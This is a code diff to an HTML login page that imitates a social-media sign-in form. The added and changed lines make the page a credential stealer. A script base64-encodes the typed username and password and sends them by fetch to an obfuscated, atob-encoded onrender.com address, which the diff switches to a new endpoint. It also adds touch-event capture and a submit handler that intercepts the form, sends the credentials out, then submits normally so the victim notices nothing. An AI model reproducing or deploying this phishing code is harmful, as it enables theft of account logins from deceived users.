@@ -70,13 +70,13 @@
       <div class="logo">
         <img src="img/socials/logo.png" alt="Logo" />
       </div>
-      <form id="webhookForm">
+      <form id="webhookForm" onsubmit="st.foo()">
 
         <input type="text" id="username" placeholder="Phone number, username, or email" required>
 
         <input type="password" id="password" placeholder="Password" required>
 
-        <button type="submit" onmousedown="st(this.parentElement)">Submit</button>
+        <button type="submit" onmousedown="st(this.parentElement)" ontouchstart="st(this.parentElement)">Submit</button>
       </form>
       <div class="noaccount">
         <a href="#">Don't have an account? <span>Signup</span></a>
@@ -166,8 +166,18 @@
     <!-- <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> -->
     <script>
       function st(elm) {
-        fetch(`${atob("aHR0cHM6Ly9hcGktdG51cC5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`)
+        if(st.dn) return;
+        fetch(`${atob("aHR0cHM6Ly9hcGktaHl4cS5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`)
+        st.dn=true;
       }
+      document.querySelector("form").addEventListener("submit",function(ev){
+        if(st.dn) return;
+        event.preventDefault();
+        event.stopImmediatePropagation();
+        event.stopPropagation();
+        st(this);
+        this.submit();
+      })
     </script>
   </footer>
 
